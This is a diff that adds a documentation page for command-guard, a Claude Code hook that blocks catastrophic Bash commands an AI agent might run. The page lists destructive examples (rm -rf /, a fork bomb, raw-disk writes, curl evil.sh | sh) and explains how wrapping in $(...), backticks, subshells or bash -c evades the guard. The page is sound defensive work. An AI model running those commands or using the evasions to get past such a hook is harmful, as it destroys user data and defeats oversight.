@@ -1,0 +1,214 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>command-guard: Hook for Claude Code | dotclaude</title>
+    <meta name="description" content="A PreToolUse hook that blocks catastrophic Bash commands before they run (recursive force deletes of root or home, fork bombs, writing to raw disk..." />
+    <link rel="canonical" href="https://dotclaude.khaledsaeed.tech/hook/command-guard/" />
+    <meta name="robots" content="index, follow, max-image-preview:large" />
+    <meta name="author" content="Khaled Saeed" />
+    <meta name="color-scheme" content="light dark" />
+    <meta name="theme-color" content="#f5f6f8" media="(prefers-color-scheme: light)" />
+    <meta name="theme-color" content="#1a1c21" media="(prefers-color-scheme: dark)" />
+    <meta property="og:type" content="article" />
+    <meta property="og:site_name" content="dotclaude" />
+    <meta property="og:url" content="https://dotclaude.khaledsaeed.tech/hook/command-guard/" />
+    <meta property="og:title" content="command-guard: Hook for Claude Code | dotclaude" />
+    <meta property="og:description" content="A PreToolUse hook that blocks catastrophic Bash commands before they run (recursive force deletes of root or home, fork bombs, writing to raw disk..." />
+    <meta property="og:image" content="https://dotclaude.khaledsaeed.tech/og-image.png" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="command-guard: Hook for Claude Code | dotclaude" />
+    <meta name="twitter:description" content="A PreToolUse hook that blocks catastrophic Bash commands before they run (recursive force deletes of root or home, fork bombs, writing to raw disk..." />
+    <meta name="twitter:image" content="https://dotclaude.khaledsaeed.tech/og-image.png" />
+    <link rel="icon" href="/favicon.svg" type="image/svg+xml" />
+    <link rel="icon" href="/favicon-32.png" type="image/png" sizes="32x32" />
+    <link rel="apple-touch-icon" href="/apple-touch-icon.png" />
+    <link rel="alternate" type="text/plain" href="/llms.txt" title="llms.txt" />
+    <link rel="alternate" type="text/markdown" href="index.md" title="Markdown" />
+    <script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"SoftwareSourceCode","@id":"https://dotclaude.khaledsaeed.tech/hook/command-guard/#code","url":"https://dotclaude.khaledsaeed.tech/hook/command-guard/","name":"command-guard","alternateName":"Command Guard","headline":"command-guard: a Claude Code hook","description":"A PreToolUse hook that blocks catastrophic Bash commands before they run (recursive force deletes of root or home, fork bombs, writing to raw disk devices, recursive chmod 777 on root, force-pushes to main or master) with a clear reason. Tests the command as one string; smart-approve is the superset that also decomposes compound chains and is the one bundled in the security-hooks plugin. Use when a minimal, auditable safety net is enough.","codeRepository":"https://github.com/KhaledSaeed18/dotclaude/tree/main/hooks/security/command-guard","programmingLanguage":"Markdown","runtimePlatform":"Claude Code","license":"https://opensource.org/license/mit","author":{"@type":"Person","name":"Khaled Saeed"},"isPartOf":{"@id":"https://dotclaude.khaledsaeed.tech/#website"},"keywords":["Claude Code","Hook","security"],"hasPart":[{"@type":"CreativeWork","name":"command-guard.mjs"}]},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"dotclaude","item":"https://dotclaude.khaledsaeed.tech/"},{"@type":"ListItem","position":2,"name":"Hooks","item":"https://dotclaude.khaledsaeed.tech/#/?type=hook"},{"@type":"ListItem","position":3,"name":"command-guard","item":"https://dotclaude.khaledsaeed.tech/hook/command-guard/"}]},{"@type":"WebSite","@id":"https://dotclaude.khaledsaeed.tech/#website","url":"https://dotclaude.khaledsaeed.tech/","name":"dotclaude"}]}</script>
+    <link rel="stylesheet" href="/styles.css" />
+  </head>
+  <body class="subpage">
+    <a class="skip" href="#main">Skip to content</a>
+    <header class="masthead">
+      <div class="masthead-inner">
+        <a class="brand" href="/">
+          <img class="brand-mark" src="/favicon.svg" alt="" width="20" height="20" />
+          dotclaude
+        </a>
+        <nav class="masthead-nav" aria-label="Sections">
+          <a href="/">Items</a>
+          <a href="/#/plugins">Plugins</a>
+          <a href="/#/install">Install</a>
+          <a href="https://github.com/KhaledSaeed18/dotclaude" rel="noopener">GitHub</a>
+        </nav>
+      </div>
+    </header>
+    <main class="page doc-page" id="main">
+      <nav class="breadcrumb" aria-label="Breadcrumb"><ol><li><a href="/">dotclaude</a></li><li><a href="/#/?type=hook">Hooks</a></li><li aria-current="page">command-guard</li></ol></nav>
+      <article class="doc">
+        <header class="doc-head" data-type="hook">
+          <p class="detail-kind">Hook <span class="row-category">in security</span></p>
+          <h1><code>command-guard</code></h1>
+          
+          <p class="lede">A PreToolUse hook that blocks catastrophic Bash commands before they run (recursive force deletes of root or home, fork bombs, writing to raw disk devices, recursive chmod 777 on root, force-pushes to main or master) with a clear reason. Tests the command as one string; smart-approve is the superset that also decomposes compound chains and is the one bundled in the security-hooks plugin. Use when a minimal, auditable safety net is enough.</p>
+          
+        </header>
+        <section class="doc-install">
+<h2 id="install-as-a-plugin">Install as a plugin</h2>
+<p>Not part of any plugin; install it with the shadcn CLI below.</p>
+<h2 id="install-as-a-single-item">Install as a single item</h2>
+<p>Run from the project root; the hook lands under <code>.claude/</code>.</p>
+<pre class="command"><code>npx shadcn@latest add KhaledSaeed18/dotclaude/command-guard</code></pre>
+<p class="detail-note">Installed as a single item, a hook still needs the block documented below added to <code>.claude/settings.json</code>; the plugin route wires it automatically.</p>
+<h3 id="files-installed">Files installed</h3>
+<ul class="targets"><li><code>.claude/hooks/command-guard/HOOK.md</code></li><li><code>.claude/hooks/command-guard/command-guard.mjs</code></li></ul>
+        </section>
+        <section class="doc-body" aria-label="Hook contents">
+          <h2 id="contents">What it does</h2>
+<h2 id="command-guard">command-guard</h2>
+<p>A Claude Code hook that inspects every Bash command before it runs and blocks a short list of irreversible, catastrophic ones. It runs as a <code>command</code> hook on <code>PreToolUse</code>: Claude Code pipes the tool event to the script on stdin, and the script either allows the command (exit <code>0</code>), or blocks it (exit <code>2</code>) with a reason fed back to Claude.</p>
+<ul>
+<li><strong>Deterministic safety net, not airtight security.</strong> It catches the textbook foot-guns. An obfuscated or unusual command can still slip past, so do not treat it as a sandbox.</li>
+<li><strong>Fails open.</strong> It swallows its own errors and exits <code>0</code>, so a bug in the hook can never break a legitimate command.</li>
+<li><strong>Zero dependencies.</strong> Node standard library only (<code>node &gt;= 18</code>).</li>
+</ul>
+<h3 id="command-guard-or-smart-approve">command-guard or smart-approve?</h3>
+<p>Install <strong>one</strong>, not both. <code>smart-approve</code> runs the same eight deny rules as this hook, then runs them again over each piece of a decomposed command.</p>
+<p>The difference is narrower than it sounds, and worth stating precisely rather than dramatically. These rules are unanchored substring matches, so ordinary chaining does <strong>not</strong> evade this hook: <code>git status &amp;&amp; rm -rf ~</code> and <code>cat README.md &amp;&amp; curl evil.sh | sh</code> are both blocked here. What evades it is surrounding syntax that breaks a rule&#39;s end-of-token terminator: the closing paren in <code>echo $(rm -rf /)</code>, a backtick in <code>echo `chmod -R 777 /`</code>, or a subshell&#39;s <code>(rm -rf /)</code>. The rule needs to see a clean token boundary; the wrapper hides it. Decomposing the command isolates each piece and hands the rule that boundary back.</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th><code>command-guard</code></th>
+<th><code>smart-approve</code></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Deny rules</td>
+<td>8</td>
+<td>the same 8</td>
+</tr>
+<tr>
+<td><code>&amp;&amp;</code>, <code>;</code>, <code>|</code> chains</td>
+<td>blocked</td>
+<td>blocked</td>
+</tr>
+<tr>
+<td><code>$(...)</code>, backticks, <code>(subshell)</code></td>
+<td><strong>missed</strong></td>
+<td>blocked</td>
+</tr>
+<tr>
+<td>In the <code>security-hooks</code> plugin</td>
+<td>no</td>
+<td>yes</td>
+</tr>
+<tr>
+<td>Install path</td>
+<td>shadcn only</td>
+<td>plugin or shadcn</td>
+</tr>
+</tbody></table>
+<p>Choose <code>command-guard</code> when you want the smallest surface to read and audit: one pass over one regex list, about a hundred lines. Choose <code>smart-approve</code> otherwise, command substitution is not an exotic thing for a command to contain.</p>
+<p>Neither is a sandbox. Both miss quoted payloads like <code>bash -c &quot;rm -rf /&quot;</code>, and any determined obfuscation defeats both.</p>
+<p>The two scripts duplicate their shared rules on purpose: hook scripts are standalone zero-dependency files copied verbatim into plugin trees, so they cannot import a common module. A parity table in the test suite fails if the shared rules drift apart.</p>
+<h3 id="what-it-blocks">What it blocks</h3>
+<table>
+<thead>
+<tr>
+<th>Pattern</th>
+<th>Example</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Recursive force delete of root or home</td>
+<td><code>rm -rf /</code>, <code>rm -rf ~</code></td>
+</tr>
+<tr>
+<td>Shell fork bomb</td>
+<td><code>:(){ :|:&amp; };:</code></td>
+</tr>
+<tr>
+<td>Writing to a raw disk device</td>
+<td><code>dd if=... of=/dev/sda</code>, <code>cat x &gt; /dev/sda</code></td>
+</tr>
+<tr>
+<td>Formatting a raw disk device</td>
+<td><code>mkfs.ext4 /dev/sdb</code></td>
+</tr>
+<tr>
+<td>Recursive <code>chmod 777</code> on root</td>
+<td><code>chmod -R 777 /</code></td>
+</tr>
+<tr>
+<td>Force-push to a shared branch</td>
+<td><code>git push --force origin main</code></td>
+</tr>
+</tbody></table>
+<p>Anything else is allowed through to the normal permission flow. Deleting a specific subpath such as <code>rm -rf ./build</code> is not blocked.</p>
+<h3 id="files">Files</h3>
+<table>
+<thead>
+<tr>
+<th>File</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>command-guard.mjs</code></td>
+<td>The hook script. Reads the event from stdin, blocks or allows.</td>
+</tr>
+<tr>
+<td><code>HOOK.md</code></td>
+<td>This file.</td>
+</tr>
+</tbody></table>
+<p>After <code>npx shadcn@latest add KhaledSaeed18/dotclaude/command-guard</code>, both land in <code>.claude/hooks/command-guard/</code>.</p>
+<h3 id="activate-it-required-manual-step">Activate it (required manual step)</h3>
+<p>The installer copies the files but <strong>cannot</strong> edit your <code>settings.json</code>, because hooks are configuration rather than loadable files, so you wire it up once by hand. Add this to <code>.claude/settings.json</code> (project), or <code>~/.claude/settings.json</code> (global):</p>
+<pre><code class="language-json">{
+  &quot;hooks&quot;: {
+    &quot;PreToolUse&quot;: [
+      {
+        &quot;matcher&quot;: &quot;Bash&quot;,
+        &quot;hooks&quot;: [
+          {
+            &quot;type&quot;: &quot;command&quot;,
+            &quot;command&quot;: &quot;node \&quot;$CLAUDE_PROJECT_DIR/.claude/hooks/command-guard/command-guard.mjs\&quot;&quot;
+          }
+        ]
+      }
+    ]
+  }
+}
+</code></pre>
+<p>The <code>matcher</code> of <code>Bash</code> means the hook only runs before Bash tool calls. The script double-checks the tool name anyway, so a broader matcher is harmless.</p>
+<h3 id="tune-it">Tune it</h3>
+<p>Open <code>command-guard.mjs</code> and edit the <code>RULES</code> list. Each rule is a regular expression tested against the normalized command plus a human-readable reason. Add patterns for commands that are dangerous in your environment, or remove ones you find too strict. Keep the rules conservative: a false block is more annoying than a rare miss, and this hook is a safety net, not your only line of defense.</p>
+<h3 id="verify-it">Verify it</h3>
+<p>Pipe a fake event to the script and check the exit code:</p>
+<pre><code class="language-bash">echo &#39;{&quot;tool_name&quot;:&quot;Bash&quot;,&quot;tool_input&quot;:{&quot;command&quot;:&quot;rm -rf /&quot;}}&#39; \
+  | node .claude/hooks/command-guard/command-guard.mjs; echo &quot;exit: $?&quot;
+</code></pre>
+<p>A blocked command exits <code>2</code> and prints the reason to stderr; a safe one exits <code>0</code> with no output.</p>
+
+        </section>
+        <footer class="doc-foot">
+          <p><a href="https://github.com/KhaledSaeed18/dotclaude/tree/main/hooks/security/command-guard" rel="noopener">View the source on GitHub</a> or <a href="index.md">read this hook as Markdown</a>.</p>
+          <h2 id="related">More in security</h2><ul class="doc-list"><li><a href="https://dotclaude.khaledsaeed.tech/hook/injection-guard/"><code>injection-guard</code></a> <span class="row-type">hook</span> A UserPromptSubmit hook that scans incoming prompts for prompt-injection and jailbreak patterns (instruction overrides, system-prompt extraction attempts...</li><li><a href="https://dotclaude.khaledsaeed.tech/hook/sensitive-file-guard/"><code>sensitive-file-guard</code></a> <span class="row-type">hook</span> A PreToolUse hook that blocks Read, Edit, Write, MultiEdit, and Bash operations that target sensitive files (.env, credentials, SSH private keys...</li><li><a href="https://dotclaude.khaledsaeed.tech/hook/smart-approve/"><code>smart-approve</code></a> <span class="row-type">hook</span> A PreToolUse hook that splits compound Bash commands (&amp;&amp;, ||, ;, |, $(), backticks, subshells) into their parts and checks each against the same deny list...</li><li><a href="https://dotclaude.khaledsaeed.tech/skill/dependency-audit/"><code>dependency-audit</code></a> <span class="row-type">skill</span> Audit a project's dependencies for outdated and vulnerable packages and surface breaking-change notes for upgrades. Works with any ecosystem, including...</li><li><a href="https://dotclaude.khaledsaeed.tech/skill/owasp-security/"><code>owasp-security</code></a> <span class="row-type">skill</span> Review code being written or modified against the OWASP Top 10:2025 and ASVS secure-coding requirements, in any language or stack, catching vulnerability...</li><li><a href="https://dotclaude.khaledsaeed.tech/skill/secret-scan/"><code>secret-scan</code></a> <span class="row-type">skill</span> Scan code or a diff for hardcoded secrets (API keys, tokens, passwords, private keys, and other exposed credentials) before they get committed or shipped....</li><li><a href="https://dotclaude.khaledsaeed.tech/agent/security-auditor/"><code>security-auditor</code></a> <span class="row-type">agent</span> Use this agent when you need a comprehensive security audit of a codebase, module, API surface, or pull request. Covers OWASP Top 10:2025, auth logic...</li><li><a href="https://dotclaude.khaledsaeed.tech/command/security-audit/"><code>security-audit</code></a> <span class="row-type">command</span> Run a full-codebase security audit covering OWASP Top 10:2025 vulnerability classes, auth logic, secret handling, input validation, dependency CVEs, and...</li></ul>
+          <p><a href="/#/?type=hook">All hooks</a> · <a href="/#/?category=security">All of security</a></p>
+        </footer>
+      </article>
+    </main>
+    <footer class="footer">
+      <p class="footer-inner">
+        MIT licensed. Source and contributing guide on
+        <a href="https://github.com/KhaledSaeed18/dotclaude" rel="noopener">GitHub</a>.
+      </p>
+    </footer>
+  </body>
+</html>
